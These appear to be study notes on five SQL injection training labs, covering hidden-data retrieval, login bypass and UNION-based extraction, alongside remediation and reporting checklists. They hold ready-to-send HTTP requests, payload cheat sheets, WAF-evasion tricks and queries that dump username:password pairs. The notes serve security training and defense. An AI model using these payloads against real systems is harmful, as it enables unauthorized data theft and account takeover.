# SQL Injection Lab-1 — Retrieving Hidden Data 

---

## 🔹 One-line summary
In-band SQL injection (WHERE-clause manipulation): inject into a filter parameter to neutralize AND released = 1 (or force the WHERE to true) and reveal unreleased/hidden products.

---

## 🔹 What is this issue?
SQL injection (SQLi) occurs when untrusted input is concatenated into SQL queries. By injecting SQL metacharacters or logic (e.g. ' OR 1=1 --) an attacker can change the query semantics and return rows the application intended to hide.

---

## 🔹 Why this matters (real-world risk)
- Exposes sensitive or unreleased data (products, user records).  
- Can escalate to data modification, account takeover, or RCE depending on DB features and privileges.  
- Often allows enumeration of database structure, union-based data extraction, or blind/time-based exfiltration.

---

## 🔹 High-value places to test
- Filter / search endpoints: /filter?category=..., /search?q=...  
- Item lookups: /product?id=..., /item?id=...  
- Sorting / pagination params: order, limit, page  
- Admin exports / downloads: /export?table=...  
- JSON APIs: values in POST/PUT JSON bodies that end up in SQL strings

---

## 🔹 Quick reconnaissance / how to spot it
1. Submit a single quote ' and look for DB errors or unusual responses.  
2. Try boolean tests: OR 1=1 vs OR 1=2 and compare content/length.  
3. Inspect JS and links for parameters that map to DB-driven pages.  
4. Watch for subtle clues: extra rows, changed pagination, different content-length, timing differences.

---

## 🔹 Lab walkthrough — compact (exact steps)
1. Open Burp Proxy and capture a normal category request (e.g., click *Techgifts*).  
2. Right-click captured request → *Send to Repeater*.  
3. Modify category parameter to neutralize the released filter, for example:

GET /filter?category=Techgifts'+OR+1=1-- HTTP/2
Host: <lab-host>
...

4. Send the modified request in Repeater and inspect the response — unreleased products should now be visible.
5. Save raw request/response as PoC and take a screenshot.
*Lab solved.*

---

## 🔹 Proof (evidence)

![SQLi payload injected in request (category modified)](../images/sqli-lab1-injected.png)  
(Screenshot 1: modified request showing payload CorporateGifts' OR 1=1-- in the URL/params.)

![Lab solved — unreleased products displayed after injection](../images/sqli-lab1-solved.png)  
(Screenshot 2: page showing unreleased products / PoC that the injection returned additional items.)

---

## 🔹 PoC / Repeater-ready example 

GET /filter?category=Techgifts'+OR+1=1-- HTTP/1.1
Host: <LAB_HOST>
User-Agent: Mozilla/5.0
Accept: /
Connection: close

---

*If the parameter is numeric, use:*  
id=1' OR 1=1-- (or id=1 OR 1=1 depending on context).

*URL-encode payloads when sending via browser* (e.g., '%20OR%201%3D1--).

---

## 🔹 Common payloads & quick cheats

- *Comment out rest:* '+-- or '+OR+1=1--  
- *Force true:* ' OR '1'='1'--  
- *Numeric id injection:* 1' OR 1=1--  
- *Time-based (MySQL):* ' OR SLEEP(5)--  
- *UNION discovery:* try ORDER BY then UNION SELECT NULL,version(),NULL-- (only if visible output)

*Always adapt comment style to the DB (--, #, /* ... */).*

---

## 🔹 Troubleshooting

- *No visible change:* try URL-encoding, use POST/JSON variants, or test different params.  
- *WAF interference:* attempt simple obfuscation (e.g., UN/**/ION) or minimal payloads.  
- *No output:* use blind techniques (time-based or OOB) *with permission*.

---

## 🔹 Fixes / remediation 

- Use *parameterized queries / prepared statements* (no string concatenation).  
- Enforce strict *whitelist validation* for known values (e.g., allowed categories).  
- Hide verbose DB errors from users; log them internally.  
- Use *least-privilege DB accounts* and separate read-only roles where possible.  
- Add monitoring / WAF as defense-in-depth (not a replacement).

---

## 🔹 Pentest checklist 

- Identify inputs reaching DB (GET/POST/JSON/headers/cookies).  
- Test ' for errors.  
- Try boolean tests: OR 1=1-- / OR 1=2--.  
- If data returned, attempt UNION/ORDER BY to enumerate columns.  
- If hidden, try time-based or OOB techniques.  
- Save PoC: raw request + response + screenshot.

---

# SQL Injection Lab-2 — Subverting Application Logic (Login Bypass) — Notes 

Lab type: in-band SQLi (authentication bypass via WHERE-clause manipulation / comment-out).

---

## 🔹 1. What is this issue?

A SQL injection in an authentication query lets an attacker manipulate the WHERE clause so the password check is never applied. By injecting a comment (e.g. --) or an always-true expression into the *username* field, the attacker can cause the query to return the target user row and the app treats them as authenticated — no password required.

---

## 🔹 2. Why this matters (real-world risk)

- Immediate account takeover (often admin).  
- Full application compromise if the account has high privileges.  
- Simple and frequently present in legacy code that concatenates inputs into SQL.  
- Easy to chain with further attacks (data exfiltration, privilege escalation, persistence).

Impact example: login as administrator → delete users / change configs / exfiltrate data.

---

## 🔹 3. High-value places to test (quick)

- Login endpoints: POST /login, /auth, /session.  
- Any endpoint that constructs SQL from user-controlled fields w/o parameterization.  
- API endpoints accepting username, userId, email in JSON or form data.

---

## 🔹 4. How to find it quickly

- Submit a single quote ' in the username and watch for errors or different behaviour.  
- Try common auth-bypass payloads in the username field:

  - administrator'--  
  - administrator' OR '1'='1  
  - admin'/*  (DB/comment dependent)

- Observe redirects, status codes, response bodies — successful injection often returns admin pages or different Location headers.

---

## 🔹 5. Lab walkthrough — compact (exact steps)

1. *Capture a baseline login request*  
   - Proxy *ON*; perform a normal login to capture POST /login (username/password).  
   - In Burp → *Proxy → HTTP history* find the POST /login and *Send to Repeater*.

2. *Send to Repeater and prepare PoC*  
   - In Repeater edit the request body (or form fields).  
   - Replace username= value with the SQL comment payload, for example:  
     
     username=administrator'--&password=anything
     

3. *Leave password blank or unchanged*  
   - You may set password= to an arbitrary value or leave it empty — the injection should remove the password check.

4. *Send the modified request*  
   - Click *Send* in Repeater and inspect raw response headers. Look for a redirect such as:
     
     HTTP/1.1 302 Found
     Location: /my-account?id=administrator
     

5. *Follow the redirect / verify in browser*  
   - Replay cookies / session in browser or follow the redirect in Repeater. If you see admin UI / account page you are authenticated as the target user. Lab solved.
     
---

## 🧾 Proof / Evidence

1. *Screenshot — PoC Repeater request/response (injected login POST)*  
   ../images/sqli-login-bypass-post.png  
   Description: Repeater request showing the modified POST /login (payload username=administrator'--) and the response headers (302 Location: /my-account?id=administrator).  
   ![PoC — SQLi login bypass](../images/sqli-login-bypass-post.png)

---

## 🔹 6. Repeater / PoC templates 

*Form-encoded login bypass (example)*

POST /login HTTP/1.1 Host: <LAB_HOST> Content-Type: application/x-www-form-urlencoded Cookie: session=<YOUR_SESSION>

username=administrator'--&password=anything

*GET-style (if login via querystring)*

GET /login?username=administrator'--&password=anything HTTP/1.1 Host: <LAB_HOST>

(Adjust method/headers to match the app. URL-encode when pasting into browser.)

---

## 🔹 7. Common payloads 

- administrator'--  (comment-out rest)  
- administrator' OR '1'='1'--  
- ' OR '1'='1'--  (may log in as first user returned)  
- admin'/*  (DB-specific comment forms)  
- Numeric ids: 1 OR 1=1--

Always adapt to DB comment style and context (string vs numeric).

---

## 🔹 8. Troubleshooting

- No redirect/visible change → try alternate comment styles (--, #, /* */) and URL-encode special chars.  
- WAF blocks simple payloads → try minor obfuscation (e.g., OR/**/1=1).  
- If query expects numeric id → remove quotes and use numeric payloads.  
- Use Repeater to inspect raw responses (redirects, cookies) rather than relying only on browser UI.

---

## 🔹 9. Fixes / remediation (what to recommend)

- Use parameterized queries / prepared statements for all DB access (no string concatenation).  
- Use ORM safe-query mechanisms; never interpolate untrusted input.  
- Return generic login error messages — avoid revealing whether username exists.  
- Apply WAF/input validation as defense-in-depth (not a substitute for parameterized queries).  
- Review & sanitize legacy auth code paths; add automated tests to detect auth bypass via injection.

---

## 🔹 10. Pentest checklist 

- Affected endpoint & method: POST /login.  
- Vulnerable parameter: username.  
- Exact PoC request & raw response showing redirect to /my-account?id=administrator.  
- Evidence: screenshot of admin page after bypass.  
- Impact: authentication bypass → admin takeover.  
- Remediation summary: parameterized queries + hardening.

---

# SQL Injection Lab-3 — Retrieving Hidden Data 

---

## 🔹 One-line summary
SQL injection lets attacker-controlled input alter a query (WHERE/UNION) so it returns rows it normally wouldn’t — e.g., unreleased products, user data, or internal information.

---

## 🔹 What is this topic? (short)
SQL injection (SQLi) occurs when untrusted input is concatenated into SQL. In the “retrieving hidden data” lab we neutralize filters (e.g., AND released = 1) or use UNION SELECT to extract hidden rows from the database.

---

## 🔹 Why this matters (real-world risk)
- *Data disclosure:* sensitive rows (users, configs, secrets) can be read.  
- *Business impact:* leak of unreleased products or internal data.  
- *Pivoting:* DB contents often reveal creds, hostnames or queries to internal services → further compromise.

---

## 🔹 High-value injection targets
- Filter/search params: /filter?category=..., /search?q=...  
- ID/item params: /product?id=..., /item?id=...  
- Sort/pagination: order, limit, page  
- JSON body fields in APIs: {"category":"..."}  
- Export endpoints: /export?table=...

---

## 🔹 Quick concept checklist
- Test a single-quote ' for errors.  
- Boolean tests: OR 1=1 vs OR 1=2.  
- Use comments to truncate remainder (--, #, /* */).  
- Count columns with UNION SELECT NULL,....  
- Use UNION SELECT 'MKR1','MKR2',... to find a reflected column.  
- If no direct output: use blind (time) or OOB (DNS/HTTP) techniques.

---

## 🔹 Lab walkthrough — exact steps 

1. *Capture baseline request*  
   - Proxy *ON* → click the category/filter in the app. Copy the captured GET /filter?category=... to *Repeater*.

2. *Sanity test*  
   - Edit parameter: add a single-quote (e.g. category=Gifts') and *Send*. Look for DB errors or page changes.

3. *Count columns (UNION-NULL method)*  
   - Try:
     
     GET /filter?category=Gifts' UNION SELECT NULL-- 
     
     If an error occurs, increase NULL count:
     
     GET /filter?category=Gifts' UNION SELECT NULL,NULL-- 
     GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- 
     
     Continue until the server returns an altered/normal response — that NULL count = number of columns.

4. *Find a reflected column*  
   - With the correct column count inject markers:
     
     GET /filter?category=Gifts' UNION SELECT 'MKR1','MKR2','MKR3'-- 
     
     (adjust number of MKR values to match column count). *Send* and inspect the raw response / page source for MKR1/MKR2/MKR3 — the one you see is the reflected column.

5. *Extract data using the reflected column*  
   - Replace the marker in the reflected column with useful functions:
     
     GET /filter?category=Gifts' UNION SELECT NULL,version(),NULL--        (if column2 reflected)
     GET /filter?category=Gifts' UNION SELECT NULL,group_concat(table_name SEPARATOR 0x3a),NULL FROM information_schema.tables WHERE table_schema=database()--
     GET /filter?category=Gifts' UNION SELECT NULL,group_concat(concat(username,0x3a,password) SEPARATOR 0x0a),NULL FROM users--
     
     Adjust queries to the DB (MySQL examples above). *Send* and capture the response showing extracted rows.

6. *Save PoC*  
   - Save the exact raw request(s) and response(s). Take a screenshot of Repeater showing the payload and the page/body with extracted data.

---

## 🧾 Proof / Evidence

1. *Screenshot — PoC request/response (columns matched)*  
  ![Injected SQL Injection in product category](../images/sqli-filter-hidden.png)
   Description: Repeater request showing the injected UNION SELECT NULL,... payload and the response containing unreleased/hidden data (used to confirm correct column count and the reflected column).

---

## 🔹 PoC / Repeater-ready example 

http
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
Host: <LAB_HOST>
User-Agent: Mozilla/5.0
Accept: /
Connection: close

When columns = 3 and column 2 is reflected:

GET /filter?category=Gifts' UNION SELECT NULL,group_concat(concat(username,0x3a,password) SEPARATOR 0x0a),NULL FROM users-- HTTP/1.1
Host: <LAB_HOST>
...

> URL-encode payloads when pasting into a browser (e.g. ' → %27, spaces → %20, -- → %2D%2D) if needed

---

## 🔹 Common payloads & quick cheats

- *Comment out rest:*  
  `' + --` or `' + OR + 1=1 --`

- *Force true:*  
  `' OR '1'='1'--`

- *Numeric id injection:*  
  `1' OR 1=1--`

- *Time-based (MySQL):*  
  `' OR SLEEP(5)--`

- *Count columns:*  
  `UNION SELECT NULL, NULL, ... --`

- *Marker test (find reflected column):*  
  `UNION SELECT 'MKR1','MKR2',... --`

> *Note:* Always adapt comment style and payload syntax to the target DB and context (--, #, /* ... */).

---

## 🔹 Troubleshooting

- *500 / syntax errors when NULL count is wrong* → increase/decrease NULL count until the server stops returning a syntax error.  
- *No visible marker* → check raw HTML, element attributes, inline scripts, and comments (the marker may be reflected in non-visible locations).  
- *Type mismatch errors* → use NULL for non-reflected columns or CAST(... AS CHAR) for type conversion.  
- *WAF blocking UNION* → try simple obfuscation (e.g., UN/**/ION) or use ORDER BY column-counting to discover number of columns.  
- *Large results truncated* → extract in smaller chunks using LIMIT/OFFSET or SUBSTRING().

---

## 🔹 Fixes / remediation (what to report)

- Use *parameterized queries / prepared statements* (never concatenate user input into SQL).  
- Enforce strict *whitelists* for expected values (categories, IDs).  
- Remove verbose DB errors from public responses; log them internally.  
- Apply *least-privilege* principles to DB accounts (no FILE/xp_cmdshell for web app user).  
- Output-encode DB-derived content and monitor for suspicious query patterns.

---

## 🔹 Pentest checklist 

1. Capture request → baseline.  
2. Test a single-quote ' → see if errors appear.  
3. Count columns using UNION SELECT NULL,....  
4. Find reflected column with UNION SELECT 'MKR1',....  
5. Extract data via group_concat / concat (or equivalent).  
6. Save raw PoC request + response and take screenshots.  
7. Recommend parameterized queries and whitelisting in the report.

---

# SQL Injection Lab-4 — Finding Columns Compatible with String Data — Notes 

---

## 🔹 One-line summary
Find the number of columns returned by a vulnerable query (UNION NULL counting) and determine which column(s) accept string data — once you know a string-compatible column you can inject textual payloads (version(), group_concat(), concat(...)) to extract schema and rows.

---

## 🔹 1. What is this topic? (short)
Determine which columns returned by a vulnerable query can hold string data. Knowing the column count *and* which column(s) accept strings is the stepping-stone from "I can inject" → "I can exfiltrate data" via UNION SELECT attacks.

---

## 🔹 2. Why this matters (real-world risk)
- String-compatible columns let you return arbitrary textual payloads (function outputs, concatenated columns, credentials).  
- Once one column reflects attacker-controlled text, you can extract DB metadata, table/column names, and rows.  
- Fast pivot to credential dumps, business-data leaks, and further exploitation (e.g., internal hostnames → SSRF).

---

## 🔹 3. High-value targets / parameters to test
- Category / filter / search parameters (e.g. /filter?category=..., /search?q=...)  
- Item identifiers (/item?id=..., /product?id=...)  
- Sort / order / pagination params (order, page, limit, offset)  
- JSON API fields (POST bodies) that end up in SELECT outputs

---

## 🔹 4. Quick concept checklist
- *Count columns:* UNION SELECT NULL,... until the response no longer errors.  
- *Test string-compatibility:* replace one NULL with a short unique token (e.g. XYZ123) per column.  
- *Conversion error = not string-compatible.* Normal response + token visible = column usable.  
- If blocked, try casting, CHAR()/chr() building, or obfuscation.

---

## 🔹 5. Lab walkthrough — exact steps 

1. *Capture baseline request*  
   - Proxy *ON* → click the category/filter in the app. Right-click the captured request → *Send to Repeater*.

2. *Determine column count (N)*  
   - In Repeater, append payloads (increase NULL count) until the DB error disappears. Example sequence:
     
     ' UNION SELECT NULL-- 
     ' UNION SELECT NULL,NULL-- 
     ' UNION SELECT NULL,NULL,NULL-- 
     
   - The first NULL count that returns a normal page = *N* columns.

3. *Get the lab token*  
   - Note the string the lab asks you to make appear (or pick a short unique token for testing), e.g. XYZ123.

4. *Test each column for string-compatibility*  
   - Replace one NULL at a time with the token. If N = 3 and token = XYZ123, try:
     
     ' UNION SELECT 'XYZ123',NULL,NULL--      (col1)
     ' UNION SELECT NULL,'XYZ123',NULL--      (col2)
     ' UNION SELECT NULL,NULL,'XYZ123'--      (col3)
     
   - Send each request and inspect the *raw HTTP response* (page source). Look for XYZ123.

5. *Handle conversion errors*  
   - If a request produces a DB conversion error (500 or explicit DB error), that column is *not* string-compatible. Skip it.

6. *When the token appears*  
   - If the token is visible and the response is normal → column is string-compatible → save the request as PoC. Lab solved.

7. *Next steps (after discovery)*  
   - Use the discovered column to inject version(), group_concat(...) or table/column enumeration payloads and extract data.

---

## 🧾 Proof / Evidence

1. *Screenshot 1 — Column count (NULLs)*  
  ![ UNION SELECT NULL](../images/sqli-columns-null-count.png)
   Description: Repeater request showing the UNION SELECT NULL,... sequence used to determine the correct column count *N* (response shows no DB error).

2. *Screenshot 2 — Token matched in column*  
  ![Compatible Data Type](../images/sqli-columns-token-match.png)  
   Description: Repeater request/response showing the test UNION SELECT where the token (XYZ123) appears in the rendered response (proof that the column accepts string data).

---

## 🔹 6. Exact PoC template 
Replace <HOST>, Techgifts, XYZ123, and adjust NULL count to N:

http
GET /filter?category=Techgifts' UNION SELECT NULL,'XYZ123',NULL-- HTTP/1.1
Host: <HOST>
User-Agent: Mozilla/5.0
Accept: /
Connection: close

## 🔹 7. Troubleshooting — common issues & fixes

- *No visible token but length changed:* view raw HTML source; token may be in attributes, script blocks, or comments.
- *Conversion error (varchar ↔ int):* that column is numeric-only — try CAST(... AS CHAR) or skip that column.
- *WAF / filters:* obfuscate UNION (UN/**/ION) or build the token via CHAR() / concat(char(...)).
- *Token escaped/encoded:* check for HTML entities, hex, or URL-encoding — decode before matching.
- *UNION blocked:* use ORDER BY to count columns (classic technique) or fall back to blind/OOB extraction.

---

## 🔹 8. Real-world attack scenarios (concise)

- Use discovered string column to UNION SELECT version(), database(), user() to fingerprint DB.
- UNION SELECT group_concat(concat(username,':',password) SEPARATOR 0x0a) ... FROM users to dump credentials (watch length limits).
- If results truncate, paginate with LIMIT/OFFSET or extract with substring() in chunks.

---

## 🔹 9. Reporting checklist (what to include)

- Vulnerable endpoint & parameter.  
- Column count *N* and which column(s) accept strings.  
- Exact PoC request showing token in response.  
- Screenshot / raw response snippet containing token.  
- Impact summary and remediation suggestions.

---

## 🔹 10. Quick remediation checklist

- Use *parameterized queries / prepared statements*.  
- Whitelist expected values (e.g., allowed categories).  
- Remove verbose DB errors from public responses.  
- Use least-privilege DB accounts; monitor unusual query patterns.  
- Rate-limit & alert repeated UNION / ORDER BY probes.

---

## 🔹 Out-of-the-box / advanced strategies (short)

- Build strings via CHAR() / chr() if literal strings fail.  
- Obfuscate UNION or use ORDER BY counting as a fallback.  
- Chunk large fields with substring() + LIMIT/OFFSET.  
- Use information_schema to enumerate tables/columns quickly.

---

# SQL Injection lab-5 — UNION Attacks — Notes 

---

## 🔹 One-line summary
A UNION SQLi appends attacker-controlled SELECT rows to the original query result. When the app reflects results, UNION lets you read database rows (users, creds, API keys) directly in the page response.

---

## 🔹 What is this topic? (short)
A UNION SQL injection allows an attacker to combine an attacker-crafted SELECT with the application’s original query and so return arbitrary rows (from users, information_schema, etc.) in the same page output.

---

## 🔹 Why this matters (real-world risk)
- *Immediate data disclosure:* user tables, password hashes, API keys.  
- *Fast pivot:* offline cracking of hashes → account takeover → lateral movement.  
- UNION is usually the fastest path from “I can inject” → “I can exfiltrate”.

---

## 🔹 High-value endpoints / parameters to test
- Category / filter / search endpoints: /filter?category=..., /search?q=...  
- Item/detail pages: /product?id=..., /item?id=...  
- Sort / pagination: order, page, limit  
- JSON API fields: POST /api/search { "q":"..." }  
- Any param that ends up in a SELECT whose results are rendered.

---

## 🔹 Quick concept checklist
1. Determine number of columns *N* (UNION SELECT NULL,...).  
2. Find which column(s) accept string data by injecting a short token into each column.  
3. Use UNION SELECT username, password FROM users (or group_concat() if needed) to exfiltrate.  
4. If UNION is blocked → obfuscate, cast, or switch to blind/OOB techniques.

---

## 🔹 Lab walkthrough — exact methodology 

1. *Capture the request*  
   - Proxy *ON* → perform the action that shows results (click category/filter).  
   - Right-click the captured request → *Send to Repeater*.

2. *Find number of columns (N)*  
   - Send these (increment `NULL`s until the page returns normally):  
     
     ' UNION SELECT NULL--  
     ' UNION SELECT NULL,NULL--  
     ' UNION SELECT NULL,NULL,NULL--  
       
   - The NULL count that returns a normal page (no SQL error) = *N*.

3. *Find string-compatible column(s)*  
   - For N columns, test each column with a unique token (replace one NULL at a time):  
     
     ' UNION SELECT 'TOK',NULL,NULL--     (if N=3, test col1)
     ' UNION SELECT NULL,'TOK',NULL--     (test col2)
     ' UNION SELECT NULL,NULL,'TOK'--     (test col3)
       
   - Inspect *raw* response for TOK. The column that displays it is string-compatible.

4. *Exfiltrate the users table*  
   - If two string columns exist:
     
     ' UNION SELECT username, password FROM users--
       
   - If only one string column: concatenate rows into one field (MySQL example):
     
     ' UNION SELECT NULL,group_concat(concat(username,':',password) SEPARATOR 0x0a) FROM users--
       
   - Adjust NULL positions so the reflected column holds the extracted data.

5. *Read results & act*  
   - Inspect raw response for username:password pairs. Use discovered admin creds to log in (only in-scope labs).

6. *Proof & report*  
   - Save the raw request + raw response showing extracted data as PoC (screenshot + raw text).

---

## 🧾 Proof / Evidence

1. *Screenshot 1 — Column count (NULLs)*  
 ![Number of columns by applying NULLS](../images/union-null-count.png)  
   Description: Repeater request showing the UNION SELECT NULL,... probes used to determine the correct column count *N* (response shows no DB error).

2. *Screenshot 2 — String column token match*  
   ![String compatible columns](../images/union-token-column-match.png)  
   Description: Repeater request/response showing the injected test token (TOK) appearing in the page output — confirms the reflected column supports string data.

3. *Screenshot 3 — Extracted credentials (administrator)*  
   ![Credentials retrieved](../images/union-admin-creds.png)  
   Description: Repeater response screenshot showing the extracted administrator credentials (displayed in the page output via UNION injection).

> Place the screenshots in the images/ folder and keep raw requests/responses alongside them for PoC.

---

## 🔹 PoC templates 

*Basic (two string cols)*
GET /filter?category=Techgifts' UNION SELECT username, password FROM users-- HTTP/1.1 Host: example.lab [other headers copied from original request]

*Concat into one column (MySQL; single reflected string column)*
GET /filter?category=Techgifts' UNION SELECT NULL,group_concat(concat(username,':',password) SEPARATOR 0x0a) FROM users-- HTTP/1.1 Host: example.lab ...

---

## 🔹 Troubleshooting & common fixes
- *No visible token but response ok:* view raw body / page source — token may be in attributes, scripts, comments.  
- *Conversion errors (500):* that column is numeric-only — try other columns or CAST(... AS CHAR).  
- *UNION blocked by WAF:* obfuscate (UN/**/ION), try ORDER BY counting, or use blind/OOB.  
- *Results truncated:* use LIMIT/OFFSET or chunk with substring() or smaller group_concat pieces.  
- *DB-specific syntax:* fingerprint DB and adapt (comment style, aggregate functions).

---

## 🔹 Reporting checklist (what to include)
- Affected endpoint & parameter.  
- Column count *N* and which column(s) accept strings.  
- Exact PoC request(s) + raw response showing the data.  
- Impact (accounts, sensitive data).  
- Short reproduction steps (3–5 lines).  
- Fixes: parameterized queries, whitelists, least privilege, hide DB errors.

---

## 🔹 Quick remediation checklist
- Use parameterized queries / prepared statements.  
- Avoid dynamic SQL built by concatenation.  
- Whitelist allowed values.  
- Limit DB account privileges.  
- Hide DB errors; log suspicious SQL patterns.

---

## 🔹 Pocket memory cue
*Count NULL`s → token per column → token visible = dump column → `UNION dump users (or group_concat).*

---

## 🔹 Out-of-the-box / advanced 
- *Fingerprint DB:* UNION SELECT version() (MySQL/Postgres/MSSQL variations).  
- *Metadata:* query information_schema.tables / information_schema.columns.  
- *Chunking:* LIMIT/OFFSET, substring() to extract long fields in pieces.  
- *When UNION blocked:* use error-based, blind/time-based, or OOB (DNS/HTTP) techniques.  
- *Obfuscation:* UN/**/ION, CHAR()-built strings to bypass naive WAFs.  
- *Pivot:* extract DB creds → internal APIs / cloud metadata / RCE (if privileges allow).  
- *Tools:* sqlmap (use with care and throttle).

---
